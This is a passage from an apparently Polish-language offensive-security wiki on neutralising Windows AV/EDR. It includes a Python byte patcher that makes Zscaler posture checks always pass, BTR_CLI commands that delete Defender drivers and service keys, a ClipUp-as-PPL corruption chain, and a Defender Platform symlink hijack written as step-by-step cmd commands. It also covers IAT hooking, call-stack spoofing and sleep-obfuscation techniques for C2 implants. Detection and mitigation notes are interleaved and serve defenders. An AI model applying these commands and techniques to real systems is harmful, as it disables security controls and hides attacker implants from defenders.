•  Włącz listę zablokowanych podatnych sterowników Microsoftu (`HVCI`, `Smart App Control`), aby system Windows nie ładował `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych usług *jądra* i generuj alerty, gdy sterownik zostanie załadowany z katalogu z prawem zapisu dla wszystkich lub nie znajduje się na liście dozwolonych.
•  Obserwuj uchwyty z trybu użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli stanu urządzenia Zscaler Client Connector przez modyfikowanie plików binarnych na dysku

**Client Connector** firmy Zscaler stosuje lokalnie reguły stanu urządzenia i korzysta z Windows RPC, aby przekazywać wyniki innym komponentom. Dwie słabe decyzje projektowe umożliwiają całkowite ominięcie kontroli:

1. Ocena stanu urządzenia odbywa się **wyłącznie po stronie klienta** (na serwer wysyłana jest wartość logiczna).
2. Wewnętrzne punkty końcowe RPC weryfikują jedynie, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Zmodyfikowanie czterech podpisanych plików binarnych na dysku** pozwala zneutralizować oba mechanizmy:

| Plik binarny | Oryginalna logika, którą zmodyfikowano | Wynik |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każdy test kończy się zgodnością |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione instrukcjami NOP ⇒ dowolny proces (nawet niepodpisany) może połączyć się z potokami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Fragment minimalnego patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wyświetlają **zielony/zgodny** status.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać punkty końcowe RPC oparte na nazwanych potokach (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Naruszony host uzyskuje nieograniczony dostęp do sieci wewnętrznej określonej przez zasady Zscaler.

To studium przypadku pokazuje, jak kilka prostych poprawek bajtów może pokonać decyzje dotyczące zaufania podejmowane wyłącznie po stronie klienta oraz proste kontrole podpisu.

## Nadużycie zaufanej funkcjonalności Microsoft Defendera `BTR.sys`

Sterownik Defendera **Boot-Time Removal** stanowi użyteczny kontrprzykład dla klasycznego BYOVD. `BTR.sys` to legalny, podpisany przez Microsoft komponent naprawczy, w którym nie ma błędu powodującego uszkodzenie pamięci ani interfejsu IOCTL; zamiast tego, po uzyskaniu dostępu administratora i `SeLoadDriverPrivilege`, operator może sfałszować prywatną transakcję naprawczą i uzyskać dostęp do zamierzonych operacji na plikach/rejestrze w Ring-0. Jest to **prymityw neutralizacji AV/EDR po naruszeniu systemu, a nie metoda uzyskania początkowego dostępu ani eskalacji uprawnień**. Sterownik można wyodrębnić z zasobu `BOOTTIMETOOL` w pliku `MpEngine.dll` samego celu, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie jednorazowego sterownika

Defender zwykle zapisuje zasób jako plik o losowej nazwie `[a-z]{8}.sys` i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany NTFS ADS, odszyfrowuje i weryfikuje listę działań, zapisuje informacje zwrotne, a po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), aby sterownik został wyładowany, zamiast pozostać w pamięci. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Strumień `:changelist` zawiera jeden zaszyfrowany blob RC4. Analizowane kompilacje używają ponownie stałego 256-bajtowego klucza, więc szyfrowanie nie stanowi granicy autoryzacji. Poprawny tekst jawny zawiera 24-bajtowy nagłówek globalny (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka i identyfikator transakcji wyprowadzony z payloadu), po którym następuje zakończona znakiem NUL ścieżka feedback w UTF-16 oraz dowolna liczba elementów. Każdy element zawiera 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i dane zależne od akcji, zakończone **dokładnie czterema bajtami NUL**. Każdy region nagłówka/danych jest sprawdzany niezależnie za pomocą CRC-32 z wielomianem `0xEDB88320`, stanem początkowym `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest resetowany dla każdego regionu.<sup>[[36]](#references)[[37]](#references)</sup>

Akceptowane identyfikatory akcji udostępniają następujące prymitywy jądra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Wynik |
| --- | --- | --- |
| 1 | `[ścieżka UTF-16]` | Usunięcie pliku, w tym zablokowanego pliku |
| 2 | `[ścieżka UTF-16]` | Usunięcie pustego katalogu |
| 3 | `[flagi][źródło][cel]` | Przeniesienie pliku do wybranej przez atakującego chronionej ścieżki; pusty cel oznacza usunięcie |
| 4 | `[flagi][ścieżka klucza]` | Rekurencyjne usunięcie klucza rejestru |
| 5 | `[flagi][ścieżka klucza + "\\" + wartość]` | Usunięcie wartości rejestru |
| 6 | `[flagi][typ][rozmiar][ścieżka klucza + "\\" + wartość][dane]` | Utworzenie/zaktualizowanie wartości rejestru i utworzenie brakujących ścieżek kluczy |

W przypadku akcji 5 i 6 separator klucza/wartości w strumieniu danych to **dwa kolejne ukośniki odwrotne**; ścieżka w typowym formacie nie zostanie poprawnie podzielona. Plik feedback w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu stają się jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają początkowego pola flag, BTR przesuwa ścieżkę do czterech zarezerwowanych bajtów na końcu, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Przepływ `BTR_CLI` i okno wczesnego rozruchu

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) realizuje cały łańcuch: wyodrębnia `BTR.sys` z lokalnego Defendera, tworzy `<random>.sys:changelist` i strumień feedback, serializuje/sumuje kontrolnie/szyfruje połączone akcje, bezpośrednio tworzy klucz rejestru usługi, a następnie wywołuje `NtLoadDriver` dla `-trigger now` lub pozostawia sterownik jako uruchamiany przy starcie systemu dla `-trigger boot`. Bezpośrednie przygotowanie rejestru omija standardową ścieżkę SCM `CreateServiceW`, dlatego **nie powoduje** wygenerowania zdarzenia instalacji usługi o identyfikatorze 7045. Artefakty utworzone dla rozruchu można później usunąć poleceniem `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nie jest użyteczne, ponieważ BTR wykonuje operacje wejścia/wyjścia na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i dowiązanie `SystemRoot` będą gotowe. `Start=1` wraz z grupą o wysokim priorytecie `Boot Bus Extender` powoduje uruchomienie w fazie 1: NTFS jest już dostępny, ale wiele sterowników zabezpieczeń uruchamianych przy starcie systemu oraz usług EDR działających w trybie użytkownika nie zostało jeszcze zainicjowanych. Filtry uruchamiane podczas rozruchu, takie jak `WdFilter`, mogą być już załadowane, ale BTR może usunąć ich pliki binarne lub konfigurację usługi przed następnym uruchomieniem, a także skasować pliki wykonywalne usług, zanim SCM je uruchomi. ELAM nie eliminuje tej luki, ponieważ BTR działa po ocenie sterowników rozruchowych i ma prawidłowy podpis Microsoft.<sup>[[36]](#references)</sup>

Wiele akcji wykonuje się w ramach jednej transakcji. PoC umieszcza na początku Action 1 dla zakodowanej na stałe ścieżki `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten dziennik, a następnie realizuje własne żądanie usunięcia i kasuje go przed wyładowaniem. Ogranicza to ilość śladów, a umieszczenie informacji zwrotnej w `<random>.sys:<random>.dat` umożliwia jednoczesne usunięcie sterownika i obu strumieni.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje o wysokiej wartości detekcyjnej

Reguły oparte wyłącznie na sygnaturach i lista blokowanych podatnych sterowników Microsoftu nie rozwiązują problemu nadużywania zamierzonej funkcjonalności BTR. Preferuj poniższe korelacje behawioralne, odróżniając przy tym prawidłowe pochodzenie Defendera od dowolnego programu uruchamiającego.<sup>[[36]](#references)</sup>

- **Sysmon 15:** utworzenie `.sys:changelist` występuje zawsze podczas przygotowywania BTR. Strumień ADS `.dat` dołączony do tego samego pliku `.sys` jest szczególnie podejrzany, ponieważ Defender zwykle umieszcza informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>` zawierającego `Args=...:changelist` i `Group=Boot Bus Extender` z brakiem odpowiadającego mu zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** koreluj załadowanie znanego sterownika BTR spoza łańcucha pochodzenia Defendera z późniejszym usunięciem pliku przypisanym do `System`/PID 4, zwłaszcza jeśli chodzi o pliki binarne związane z bezpieczeństwem.
- **Sysmon 11 -> 23:** generuj alert przy szybkim utworzeniu i usunięciu `\SystemRoot\Temp\BootClean.log` przez `System`/PID 4.
- Ogranicz i audytuj nadawanie/włączanie uprawnienia `SeLoadDriverPrivilege`; sam podpis Microsoftu nie wystarcza do uznania za zaufany sterownika narzędzia zabezpieczającego przygotowanego przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do manipulowania AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) wymusza hierarchię poziomów/podpisujących, dzięki czemu procesy chronione mogą wzajemnie modyfikować się tylko wtedy, gdy mają równy lub wyższy poziom ochrony. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić plik binarny obsługujący PPL i kontrolować przekazywane mu argumenty, możesz przekształcić nieszkodliwą funkcjonalność (np. logowanie) w ograniczoną, opartą na PPL możliwość zapisu do chronionych katalogów używanych przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że proces działa jako PPL
- Docelowy plik EXE (oraz wszystkie załadowane biblioteki DLL) musi być podpisany przy użyciu EKU obsługującego PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony, odpowiadającego podpisującemu plik binarny (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla podpisujących antimalware, `PROTECTION_LEVEL_WINDOWS` dla podpisujących Windows). Nieprawidłowe poziomy spowodują niepowodzenie tworzenia procesu.

Zobacz też szersze wprowadzenie do PP/PPL i ochrony LSASS tutaj:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia do uruchamiania
- Pomocnik open source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego pliku EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schemat użycia:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Prymityw LOLBIN: ClipUp.exe
- Podpisany plik systemowy `C:\Windows\System32\ClipUp.exe` uruchamia własny proces potomny i przyjmuje parametr wskazujący ścieżkę, pod którą ma zapisać plik dziennika.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi przetwarzać ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać normalnie chronione lokalizacje.

Narzędzia pomocnicze do krótkich ścieżek 8.3
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (zarys)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z użyciem `CREATE_PROTECTED_PROCESS` za pośrednictwem programu uruchamiającego (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki dziennika ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli AV zwykle otwiera/blokuje plik docelowy podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę automatycznego startu, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność uruchamiania za pomocą Process Monitor (rejestrowanie rozruchu).
4) Podczas ponownego uruchomienia zapis z uprawnieniami PPL nastąpi, zanim AV zablokuje swoje pliki binarne, uszkadzając plik docelowy i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki ukryto lub skrócono ze względów bezpieczeństwa):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Uwagi i ograniczenia
- Nie możesz kontrolować zawartości zapisywanej przez ClipUp — możesz jedynie określić jej lokalizację; ta prymitywna technika nadaje się do uszkadzania, a nie precyzyjnego wstrzykiwania zawartości.
- Do zainstalowania/uruchomienia usługi i zaplanowania okna na ponowne uruchomienie wymagane są lokalne uprawnienia administratora/SYSTEM.
- Kluczowe jest wyczucie czasu: wskazany plik nie może być otwarty; wykonanie podczas rozruchu pozwala uniknąć blokad plików.

Wykrywanie
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy jego procesem nadrzędnym jest niestandardowy program uruchamiający, w czasie rozruchu.
- Nowe usługi skonfigurowane do automatycznego uruchamiania podejrzanych plików binarnych i konsekwentnie startujące przed Defender/AV. Zbadaj tworzenie/modyfikowanie usług poprzedzające błędy uruchamiania Defendera.
- Monitorowanie integralności plików plików binarnych Defendera/katalogów Platform; nieoczekiwane tworzenie/modyfikowanie plików przez procesy z flagami procesu chronionego.
- Telemetria ETW/EDR: szukaj procesów utworzonych z użyciem `CREATE_PROTECTED_PROCESS` oraz anomalii w użyciu poziomu PPL przez pliki binarne niezwiązane z AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i w jakim kontekście nadrzędnym; blokuj wywołania ClipUp poza uzasadnionymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikowanie usług uruchamianych automatycznie i monitoruj manipulowanie kolejnością ich uruchamiania.
- Upewnij się, że ochrona przed manipulacją Defendera i zabezpieczenia wczesnego uruchamiania są włączone; zbadaj błędy uruchamiania wskazujące na uszkodzenie plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach zawierających narzędzia bezpieczeństwa, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

## Manipulowanie Microsoft Defender przez przejęcie symlinka do katalogu wersji Platform

Windows Defender wybiera platformę, z której działa, przez wyliczenie podfolderów w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia z niego procesy usługi Defendera (odpowiednio aktualizując ścieżki usługi/rejestru). Ten wybór ufa wpisom katalogów, w tym punktom ponownej analizy będącym katalogami (symlinkom). Administrator może wykorzystać to, aby przekierować Defendera do ścieżki zapisywalnej przez atakującego i przeprowadzić DLL sideloading lub zakłócić działanie usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Warunki wstępne
- Lokalny administrator (wymagany do tworzenia katalogów/symlinków w folderze Platform)
- Możliwość ponownego uruchomienia systemu lub wywołania ponownego wyboru platformy Defendera (ponowne uruchomienie usługi podczas rozruchu)
- Wymagane są tylko wbudowane narzędzia (`mklink`)

Dlaczego to działa
- Defender blokuje zapisy w swoich własnych folderach, ale podczas wyboru platformy ufa wpisom katalogów i wybiera najwyższą leksykograficznie wersję, nie sprawdzając, czy cel prowadzi do chronionej/zaufanej ścieżki.

Krok po kroku (przykład)
1) Przygotuj zapisywalny klon bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz w Platform dowiązanie symboliczne katalogu o wyższej wersji wskazujące na Twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecany restart):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) jest uruchomiony z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinna być widoczna nowa ścieżka procesu w `C:\TMP\AV\` oraz konfiguracja usługi/rejestru wskazująca tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Umieść lub zastąp biblioteki DLL ładowane przez Defendera z jego katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, aby przy następnym uruchomieniu skonfigurowana ścieżka nie wskazywała na żaden plik, a Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Pamiętaj, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły red team mogą przenieść unikanie wykrycia w czasie działania z implantów C2 do samego modułu docelowego, przechwytując jego Import Address Table (IAT) i kierując wybrane API do kontrolowanego przez atakującego, niezależnego od położenia kodu (PIC). Pozwala to rozszerzyć unikanie wykrycia poza niewielki zestaw API udostępniany przez wiele kitów (np. CreateProcessA) oraz zapewnić te same zabezpieczenia dla BOF-ów i bibliotek DLL używanych po uzyskaniu dostępu.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście w skrócie
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (jako poprzedzający go kod albo moduł towarzyszący). PIC musi być samowystarczalny i niezależny od położenia.
- Podczas ładowania hostującej biblioteki DLL przejdź przez jej IMAGE_IMPORT_DESCRIPTOR i zmień wpisy IAT wybranych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na proste wrappery PIC.
- Każdy wrapper PIC wykonuje techniki unikania wykrycia, a następnie przekazuje sterowanie do właściwego adresu API za pomocą tail-call. Typowe techniki obejmują:
  - Maskowanie/odmaskowywanie pamięci wokół wywołania (np. szyfrowanie regionów beaconu, zmiana uprawnień z RWX na RX, zmiana nazw/uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
  - Call-Stack Spoofing: utworzenie wiarygodnego stosu i przejście do docelowego API, tak aby analiza call stacka wskazywała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Aby zapewnić zgodność, udostępnij interfejs, który pozwoli skryptowi Aggressor (lub jego odpowiednikowi) zarejestrować API do przechwycenia dla Beacon, BOF-ów i bibliotek DLL używanych po uzyskaniu dostępu.

Dlaczego warto tu użyć IAT hooking
- Działa z dowolnym kodem korzystającym z przechwyconego importu, bez modyfikowania kodu narzędzia ani polegania na tym, że Beacon będzie pośredniczył w wywołaniach określonych API.
- Obejmuje biblioteki DLL używane po uzyskaniu dostępu: przechwycenie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować te same techniki maskowania i unikania analizy stosu do ich wywołań API.
- Przywraca niezawodne działanie poleceń uruchamiających procesy po uzyskaniu dostępu w obliczu detekcji opartych na call stacku, dzięki opakowaniu CreateProcessA/W.

Minimalny szkic IAT hooka (pseudokod w C/C++ dla x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Uwagi
- Zastosuj patch po relokacjach/ASLR i przed pierwszym użyciem importu. Reflective loaders, takie jak TitanLdr/AceLdr, pokazują, jak wykonywać hooking podczas DllMain załadowanego modułu.
- Wrappery powinny być niewielkie i bezpieczne dla PIC; prawdziwe API należy rozwiązać za pomocą oryginalnej wartości IAT przechwyconej przed zastosowaniem patcha albo przez LdrGetProcedureAddress.
- W przypadku PIC stosuj przejścia RW → RX i unikaj pozostawiania stron z prawami zapisu i wykonywania.

Stub do spoofingu call stacka
- Stub-y PIC w stylu Draugr budują fałszywy łańcuch wywołań (adresy powrotu wewnątrz benign modules), a następnie przekazują sterowanie do prawdziwego API.
- Pozwala to ominąć detekcje, które oczekują kanonicznych stosów wywołań z Beacon/BOFs do wrażliwych API.
- Połącz to z technikami stack cutting/stack stitching, aby przed prologiem API znaleźć się wewnątrz oczekiwanych ramek.

Integracja operacyjna
- Dodaj reflective loader na początku DLL-i post-ex, aby PIC i hooki inicjalizowały się automatycznie po załadowaniu DLL-a.
- Użyj skryptu Aggressor do zarejestrowania docelowych API, dzięki czemu Beacon i BOFs będą transparentnie korzystać z tej samej ścieżki omijania detekcji, bez zmian w kodzie.

Uwagi dotyczące detekcji/DFIR
- Integralność IAT: wpisy wskazujące na adresy spoza obrazu (heap/anon); okresowa weryfikacja wskaźników importu.
- Anomalie stosu: adresy powrotu nienależące do załadowanych obrazów; nagłe przejścia do PIC spoza obrazu; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy w IAT w procesie; wczesna aktywność DllMain modyfikująca thunki importu; nieoczekiwane obszary RX tworzone podczas ładowania.
- Omijanie image-load: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania zestawów automation/clr skorelowane ze zdarzeniami maskowania pamięci.

Powiązane elementy i przykłady
- Reflective loaders wykonujące patchowanie IAT podczas ładowania (np. TitanLdr, AceLdr)
- Hooki maskujące pamięć (np. simplehook) i PIC stosujące stack cutting (stackcutting)
- Stub-y PIC do spoofingu call stacka (np. Draugr)


## Hooking IAT podczas importu + Sleep Obfuscation (Crystal Palace/PICO)

### Hooki IAT podczas importu za pośrednictwem rezydentnego PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik loadera `GetProcAddress` własnym resolverem, który najpierw sprawdza hooki:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Zbuduj **rezydentny PICO** (trwały obiekt PIC), który przetrwa zwolnienie tymczasowego PIC loadera.
- Udostępnij funkcję `setup_hooks()`, która nadpisuje resolver importów loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy przez ordinal i użyj opartego na hashach wyszukiwania hooków, takiego jak `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie przekaż wywołanie do prawdziwego `GetProcAddress`.
- Zarejestruj cele hooków podczas linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje prawidłowy, ponieważ znajduje się wewnątrz rezydentnego PICO.

Daje to **przekierowanie IAT podczas importu** bez patchowania sekcji kodu załadowanej DLL-i po załadowaniu.

### Wymuszanie importów możliwych do hookowania, gdy cel używa PEB-walking

Hooki podczas importu zadziałają tylko wtedy, gdy funkcja rzeczywiście znajduje się w IAT celu. Jeśli moduł rozwiązuje API przez PEB-walk + hash (bez wpisu importu), wymuś rzeczywisty import, aby ścieżka `ProcessImports()` loadera mogła go obsłużyć:

- Zastąp rozwiązywanie eksportu przez hash (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając przechwycenie podczas rozwiązywania importów przez reflective loader.

### Obfuskacja uśpienia/bezczynności w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste prymitywy oczekiwania/IPC** używane przez implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długiego oczekiwania opakuj wywołanie w łańcuch obfuskacji w stylu Ekko, który szyfruje obraz w pamięci podczas bezczynności:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z przygotowanymi ramkami `CONTEXT`.
- Typowy łańcuch (x64): ustaw obraz jako `PAGE_READWRITE` → zaszyfruj RC4 za pomocą `advapi32!SystemFunction032` cały zmapowany obraz → wykonaj blokujące oczekiwanie → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, iterując po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza wzorcowy `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać poszczególne kroki.

Szczegół operacyjny: zwracaj „success” w przypadku długiego oczekiwania (np. `WAIT_OBJECT_0`), aby wywołujący kontynuował działanie, gdy obraz jest zamaskowany. Ten wzorzec ukrywa moduł przed skanerami w okresach bezczynności i pozwala uniknąć charakterystycznego śladu klasycznego, spatchowanego `Sleep()`.

Pomysły na detekcję (na podstawie telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buforach wielkości obrazu.
- `VirtualProtect` obejmujące duży zakres, po którym następuje niestandardowe przywracanie uprawnień poszczególnych sekcji.

### Rejestracja CFG w czasie działania dla gadżetów sleep-obfuscation

W celach z włączonym CFG pierwszy pośredni skok do gadżetu w środku funkcji, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle spowoduje awarię procesu z kodem `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadżetu nie ma w metadanych CFG modułu. Aby łańcuchy w stylu Ekko/Kraken działały w zabezpieczonych procesach:<sup>[[30]](#references)</sup>

- Zarejestruj każdy pośredni cel używany przez łańcuch za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- W przypadku adresów wewnątrz załadowanych obrazów (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **bazy obrazu** i obejmować **pełny rozmiar obrazu**.
- W przypadku ręcznie mapowanych obszarów/PIC/stomped regions użyj **bazy alokacji** i zamiast tego rozmiaru alokacji.
- Oznacz nie tylko gadżet sterujący, ale także eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wywołania systemowe oczekiwania/zdarzeń) oraz wszystkie kontrolowane przez atakującego sekcje wykonywalne, które będą pośrednimi celami.

Dzięki temu łańcuchy uśpienia w stylu ROP/JOP zmieniają się z „działają tylko w procesach bez CFG” w wielokrotnego użytku prymityw dla `explorer.exe`, przeglądarek, `svchost.exe` i innych punktów końcowych skompilowanych z `/guard:cf`.

### Spoofing stosu bezpieczny dla CET wątków uśpionych

Pełna zamiana `CONTEXT` jest widoczna i może powodować problemy w systemach CET Shadow Stack, ponieważ spoofowany `Rip` nadal musi zgadzać się ze sprzętowym shadow stackiem. Bezpieczniejszy wzorzec maskowania podczas uśpienia:<sup>[[30]](#references)</sup>

- Wybierz inny wątek w tym samym procesie i odczytaj granice jego stosu `NT_TIB` / TEB (`StackBase`, `StackLimit`) za pomocą `NtQueryInformationThread`.
- Zrób kopię zapasową rzeczywistego TEB/TIB bieżącego wątku.
- Przechwyć rzeczywisty kontekst śpiącego wątku za pomocą `GetThreadContext`.
- Skopiuj **wyłącznie** rzeczywisty `Rip` do spoofowanego kontekstu, pozostawiając spoofowany stan `Rsp`/stosu bez zmian.
- W czasie uśpienia skopiuj `NT_TIB` spoofowanego wątku do bieżącego TEB, aby stack walkery rozwijały stos w prawidłowym zakresie.
- Po zakończeniu oczekiwania przywróć oryginalny TIB i kontekst wątku.

Zachowuje to wskaźnik instrukcji zgodny z CET, jednocześnie wprowadzając w błąd stack walkery EDR, które ufają metadanym stosu TEB przy weryfikacji rozwijania stosu.

### Alternatywa oparta na APC: Kraken Mask

